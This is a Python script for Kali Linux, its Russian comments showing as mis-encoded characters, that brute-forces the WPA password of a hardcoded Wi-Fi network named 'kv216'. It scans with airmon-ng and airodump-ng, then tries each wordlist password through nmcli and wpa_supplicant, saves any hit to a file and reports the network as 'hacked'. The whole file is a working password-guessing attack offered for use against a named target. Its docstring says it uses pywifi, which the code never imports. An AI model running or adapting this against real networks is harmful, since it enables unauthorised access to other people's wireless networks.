#!/usr/bin/env python3
"""
WiFi Password Cracker –¥–ª—è Kali Linux
–ò—Å–ø–æ–ª—å–∑—É–µ—Ç pywifi –¥–ª—è –ø–æ–¥–±–æ—Ä–∞ –ø–∞—Ä–æ–ª–µ–π –∏–∑ wordlist
"""

import subprocess
import time
import os
import sys
import threading
from datetime import datetime

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
TARGET_SSID = "kv216"  # –ò–º—è —Å–µ—Ç–∏ –¥–ª—è –≤–∑–ª–æ–º–∞
WORDLIST_FILE = "quick_list.txt"  # –§–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏
INTERFACE = "wlan0"  # Wi-Fi –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
TIMEOUT_PER_PASSWORD = 5  # –°–µ–∫—É–Ω–¥ –Ω–∞ –ø–æ–ø—ã—Ç–∫—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
SCAN_TIME = 10  # –í—Ä–µ–º—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —Å–µ—Ç–µ–π

class WiFiCracker:
    def __init__(self):
        """–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è"""
        self.stop_flag = False
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        
        print(f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë    WiFi Password Cracker              ‚ïë
‚ïë    Target: {TARGET_SSID:<20} ‚ïë
‚ïë    Wordlist: {WORDLIST_FILE:<18} ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ root
        if os.geteuid() != 0:
            print("[-] –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å sudo!")
            sys.exit(1)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–∞–π–ª–∞ wordlist
        if not os.path.exists(WORDLIST_FILE):
            print(f"[-] –§–∞–π–ª {WORDLIST_FILE} –Ω–µ –Ω–∞–π–¥–µ–Ω!")
            print(f"[!] –°–æ–∑–¥–∞–π—Ç–µ —Ñ–∞–π–ª –∏–ª–∏ —É–∫–∞–∂–∏—Ç–µ –¥—Ä—É–≥–æ–π –ø—É—Ç—å")
            sys.exit(1)
    
    def check_wifi_interface(self):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ Wi-Fi –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞"""
        print("[*] –ü—Ä–æ–≤–µ—Ä–∫–∞ Wi-Fi –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞...")
        
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã
            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
            
            if INTERFACE not in result.stdout:
                print(f"[-] –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å {INTERFACE} –Ω–µ –Ω–∞–π–¥–µ–Ω!")
                print("[+] –î–æ—Å—Ç—É–ø–Ω—ã–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã:")
                for line in result.stdout.split('\n'):
                    if 'IEEE' in line:
                        print(f"    {line.split()[0]}")
                return False
            
            print(f"[+] –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å {INTERFACE} –Ω–∞–π–¥–µ–Ω")
            return True
            
        except Exception as e:
            print(f"[-] –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞: {e}")
            return False
    
    def scan_for_target(self):
        """–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –ø–æ–∏—Å–∫–∞ —Ü–µ–ª–µ–≤–æ–π —Å–µ—Ç–∏"""
        print(f"[*] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ç–µ–π –¥–ª—è –ø–æ–∏—Å–∫–∞ '{TARGET_SSID}'...")
        
        try:
            # –í–∫–ª—é—á–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–Ω—ã–π —Ä–µ–∂–∏–º
            print("[*] –í–∫–ª—é—á–∞—é —Ä–µ–∂–∏–º –º–æ–Ω–∏—Ç–æ—Ä–∞...")
            subprocess.run(["airmon-ng", "check", "kill"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["airmon-ng", "start", INTERFACE], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            monitor_iface = f"{INTERFACE}mon"
            
            # –°–∫–∞–Ω–∏—Ä—É–µ–º —Å–µ—Ç–∏
            print(f"[*] –°–∫–∞–Ω–∏—Ä—É—é {SCAN_TIME} —Å–µ–∫—É–Ω–¥...")
            cmd = ["airodump-ng", monitor_iface, "--write", "/tmp/scan", 
                   "--output-format", "csv"]
            
            scan_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                        stderr=subprocess.DEVNULL)
            
            # –ñ–¥–µ–º –∏ –ø—Ä–µ—Ä—ã–≤–∞–µ–º
            time.sleep(SCAN_TIME)
            scan_proc.terminate()
            
            # –ß–∏—Ç–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
            if os.path.exists("/tmp/scan-01.csv"):
                with open("/tmp/scan-01.csv", "r") as f:
                    content = f.read()
                    
                # –ò—â–µ–º —Ü–µ–ª–µ–≤—É—é —Å–µ—Ç—å
                lines = content.split('\n')
                target_found = False
                
                for line in lines:
                    if TARGET_SSID in line:
                        parts = line.split(',')
                        if len(parts) > 13:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            power = parts[8].strip() if len(parts) > 8 else "N/A"
                            
                            print(f"[+] –¶–ï–õ–ï–í–ê–Ø –°–ï–¢–¨ –ù–ê–ô–î–ï–ù–ê!")
                            print(f"    SSID: {TARGET_SSID}")
                            print(f"    BSSID: {bssid}")
                            print(f"    Channel: {channel}")
                            print(f"    Signal: {power} dBm")
                            target_found = True
                            break
                
                if not target_found:
                    print(f"[-] –°–µ—Ç—å '{TARGET_SSID}' –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
                    return False
            else:
                print("[-] –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —Å–µ—Ç–∏")
                return False
            
            # –í—ã–∫–ª—é—á–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–Ω—ã–π —Ä–µ–∂–∏–º
            subprocess.run(["airmon-ng", "stop", monitor_iface], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
            
        except KeyboardInterrupt:
            print("\n[*] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–µ—Ä–≤–∞–Ω–æ")
            return False
        except Exception as e:
            print(f"[-] –û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: {e}")
            return False
    
    def load_passwords(self):
        """–ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞—Ä–æ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞"""
        print(f"[*] –ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞—Ä–æ–ª–µ–π –∏–∑ {WORDLIST_FILE}...")
        
        passwords = []
        try:
            with open(WORDLIST_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    if pwd and len(pwd) >= 8:  # WPA2 —Ç—Ä–µ–±—É–µ—Ç –º–∏–Ω–∏–º—É–º 8 —Å–∏–º–≤–æ–ª–æ–≤
                        passwords.append(pwd)
            
            if not passwords:
                print("[-] –ù–µ—Ç –ø–∞—Ä–æ–ª–µ–π –≤ —Ñ–∞–π–ª–µ (—Ç—Ä–µ–±—É–µ—Ç—Å—è –º–∏–Ω–∏–º—É–º 8 —Å–∏–º–≤–æ–ª–æ–≤)")
                return None
            
            print(f"[+] –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–∞—Ä–æ–ª–µ–π")
            print(f"[+] –ü–µ—Ä–≤—ã–µ 5 –ø–∞—Ä–æ–ª–µ–π: {', '.join(passwords[:5])}")
            
            return passwords
            
        except Exception as e:
            print(f"[-] –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ wordlist: {e}")
            return None
    
    def try_connect_nmcli(self, password):
        """–ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ nmcli (NetworkManager)"""
        try:
            # –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –µ—Å–ª–∏ –µ—Å—Ç—å
            subprocess.run(["nmcli", "connection", "delete", TARGET_SSID], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
            cmd = [
                "nmcli", "device", "wifi", "connect", TARGET_SSID,
                "password", password, "ifname", INTERFACE
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_PER_PASSWORD)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
            if "successfully activated" in result.stdout or "successfully" in result.stdout:
                return True
            elif "Secrets were required" in result.stderr:
                # –ü–∞—Ä–æ–ª—å –Ω–µ–≤–µ—Ä–Ω—ã–π
                return False
            else:
                # –î—Ä—É–≥–∞—è –æ—à–∏–±–∫–∞
                return False
                
        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            return False
    
    def try_connect_wpa_supplicant(self, password):
        """–ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ wpa_supplicant"""
        try:
            # –°–æ–∑–¥–∞–µ–º –∫–æ–Ω—Ñ–∏–≥ —Ñ–∞–π–ª
            config = f"""
network={{
    ssid="{TARGET_SSID}"
    psk="{password}"
}}
            """
            
            with open("/tmp/wpa.conf", "w") as f:
                f.write(config)
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º wpa_supplicant
            cmd = [
                "wpa_supplicant", "-i", INTERFACE, "-c", "/tmp/wpa.conf",
                "-B"  # –§–æ–Ω–æ–≤—ã–π —Ä–µ–∂–∏–º
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL)
            
            # –ñ–¥–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
            time.sleep(3)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å
            check_cmd = ["iwconfig", INTERFACE]
            result = subprocess.run(check_cmd, capture_output=True, text=True)
            
            # –£–±–∏–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å
            proc.terminate()
            
            # –û—á–∏—â–∞–µ–º
            if os.path.exists("/tmp/wpa.conf"):
                os.remove("/tmp/wpa.conf")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
            if TARGET_SSID in result.stdout:
                return True
            else:
                return False
                
        except Exception as e:
            # –û—á–∏—Å—Ç–∫–∞ –ø—Ä–∏ –æ—à–∏–±–∫–µ
            try:
                os.remove("/tmp/wpa.conf")
            except:
                pass
            return False
    
    def display_progress(self):
        """–û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ"""
        print("[*] –ù–∞—á–∏–Ω–∞—é –ø–æ–¥–±–æ—Ä –ø–∞—Ä–æ–ª—è...")
        print("[*] –ù–∞–∂–º–∏—Ç–µ Ctrl+C –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏\n")
        
        self.start_time = datetime.now()
        
        while not self.stop_flag and self.found_password is None:
            elapsed = (datetime.now() - self.start_time).seconds
            speed = self.attempts / max(elapsed, 1)
            
            sys.stdout.write(f"\r[‚è±Ô∏è {elapsed}s] [üîë {self.attempts}] [‚ö° {speed:.1f}/s] –ü–æ–¥–±–æ—Ä...")
            sys.stdout.flush()
            time.sleep(1)
    
    def crack(self):
        """–û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–¥–±–æ—Ä–∞"""
        
        # –®–∞–≥ 1: –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
        if not self.check_wifi_interface():
            return False
        
        # –®–∞–≥ 2: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Å–µ—Ç–∏
        print("\n[*] –ü—Ä–æ–≤–µ—Ä—è—é –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Å–µ—Ç–∏...")
        check_cmd = ["iwlist", INTERFACE, "scan"]
        try:
            result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=10)
            if TARGET_SSID not in result.stdout:
                print(f"[-] –°–µ—Ç—å '{TARGET_SSID}' –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –≤ –¥–∏–∞–ø–∞–∑–æ–Ω–µ")
                print("[!] –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ:")
                print("    1. –°–µ—Ç—å –∞–∫—Ç–∏–≤–Ω–∞")
                print("    2. –í—ã –≤ –∑–æ–Ω–µ –¥–µ–π—Å—Ç–≤–∏—è")
                print("    3. SSID —É–∫–∞–∑–∞–Ω –ø—Ä–∞–≤–∏–ª—å–Ω–æ")
                return False
            print(f"[+] –°–µ—Ç—å '{TARGET_SSID}' –¥–æ—Å—Ç—É–ø–Ω–∞")
        except:
            print("[!] –ü—Ä–æ–ø—É—Å–∫–∞—é –ø—Ä–æ–≤–µ—Ä–∫—É —Å–µ—Ç–∏ (–º–æ–∂–µ—Ç —Ç—Ä–µ–±–æ–≤–∞—Ç—å –º–æ–Ω–∏—Ç–æ—Ä–Ω—ã–π —Ä–µ–∂–∏–º)")
        
        # –®–∞–≥ 3: –ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞—Ä–æ–ª–µ–π
        passwords = self.load_passwords()
        if not passwords:
            return False
        
        # –®–∞–≥ 4: –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
        progress_thread = threading.Thread(target=self.display_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        # –®–∞–≥ 5: –ü–æ–¥–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π
        try:
            for password in passwords:
                if self.stop_flag:
                    break
                
                self.attempts += 1
                
                # –ü—Ä–æ–±—É–µ–º –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è
                if self.attempts % 10 == 0:
                    sys.stdout.write(f"\r[‚è±Ô∏è {(datetime.now() - self.start_time).seconds}s] [üîë {self.attempts}] –¢–µ—Å—Ç: '{password[:20]}'")
                    sys.stdout.flush()
                
                # –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ –º–µ—Ç–æ–¥—ã –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
                connected = False
                
                # –ú–µ—Ç–æ–¥ 1: nmcli (—Å–∞–º—ã–π –Ω–∞–¥–µ–∂–Ω—ã–π)
                connected = self.try_connect_nmcli(password)
                
                # –ú–µ—Ç–æ–¥ 2: wpa_supplicant (–µ—Å–ª–∏ –ø–µ—Ä–≤—ã–π –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª)
                if not connected:
                    connected = self.try_connect_wpa_supplicant(password)
                
                # –ï—Å–ª–∏ –ø–æ–¥–∫–ª—é—á–∏–ª–∏—Å—å
                if connected:
                    self.found_password = password
                    self.stop_flag = True
                    
                    # –î–∞–µ–º –≤—Ä–µ–º—è –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
                    time.sleep(2)
                    
                    print(f"\n\n{'='*60}")
                    print(f"[üéâ] –ü–ê–†–û–õ–¨ –ù–ê–ô–î–ï–ù!")
                    print(f"[üì∂] –°–µ—Ç—å: {TARGET_SSID}")
                    print(f"[üîë] –ü–∞—Ä–æ–ª—å: {password}")
                    print(f"[‚è±Ô∏è] –í—Ä–µ–º—è: {(datetime.now() - self.start_time).seconds} —Å–µ–∫—É–Ω–¥")
                    print(f"[üîç] –ü–æ–ø—ã—Ç–æ–∫: {self.attempts}")
                    print(f"{'='*60}")
                    
                    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                    self.save_result(password)
                    return True
        
        except KeyboardInterrupt:
            print(f"\n\n[*] –ü–æ–¥–±–æ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
            self.stop_flag = True
        except Exception as e:
            print(f"\n\n[-] –û—à–∏–±–∫–∞ –ø–æ–¥–±–æ—Ä–∞: {e}")
            self.stop_flag = True
        
        # –ï—Å–ª–∏ –Ω–µ –Ω–∞—à–ª–∏
        if not self.found_password:
            self.stop_flag = True
            time.sleep(2)  # –î–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å—É –æ–±–Ω–æ–≤–∏—Ç—å—Å—è
            
            print(f"\n\n[-] –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω —Å—Ä–µ–¥–∏ {self.attempts} –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤")
            print(f"[-] –ó–∞—Ç—Ä–∞—á–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è: {(datetime.now() - self.start_time).seconds} —Å–µ–∫—É–Ω–¥")
            print("[!] –ü–æ–ø—Ä–æ–±—É–π—Ç–µ:")
            print("    1. –†–∞—Å—à–∏—Ä–∏—Ç—å wordlist")
            print("    2. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å, –∞–∫—Ç–∏–≤–Ω–∞ –ª–∏ —Å–µ—Ç—å")
            print("    3. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä—É–≥–∏–µ –º–µ—Ç–æ–¥—ã –∞—Ç–∞–∫–∏")
        
        return False
    
    def save_result(self, password):
        """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞"""
        try:
            filename = f"cracked_{TARGET_SSID}.txt"
            with open(filename, "w") as f:
                f.write(f"–í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"–°–µ—Ç—å: {TARGET_SSID}\n")
                f.write(f"–ü–∞—Ä–æ–ª—å: {password}\n")
                f.write(f"–ü–æ–ø—ã—Ç–æ–∫: {self.attempts}\n")
                f.write(f"Wordlist: {WORDLIST_FILE}\n")
                f.write("-" * 40 + "\n")
            
            print(f"[üíæ] –†–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ {filename}")
            
        except Exception as e:
            print(f"[-] –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: {e}")

def main():
    """–¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞"""
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –≤–∑–ª–æ–º—â–∏–∫–∞
    cracker = WiFiCracker()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –≤–∑–ª–æ–º
    success = cracker.crack()
    
    # –§–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    if success:
        print("\n[‚úÖ] –£—Å–ø–µ—à–Ω–æ –≤–∑–ª–æ–º–∞–Ω–æ!")
        print(f"[üì°] –ü–æ–¥–∫–ª—é—á–∞–π—Ç–µ—Å—å –∫ {TARGET_SSID} —Å –Ω–∞–π–¥–µ–Ω–Ω—ã–º –ø–∞—Ä–æ–ª–µ–º")
    else:
        print("\n[‚ùå] –í–∑–ª–æ–º –Ω–µ —É–¥–∞–ª—Å—è")
    
    print("\n[*] –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] –ü—Ä–æ–≥—Ä–∞–º–º–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"\n[!] –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")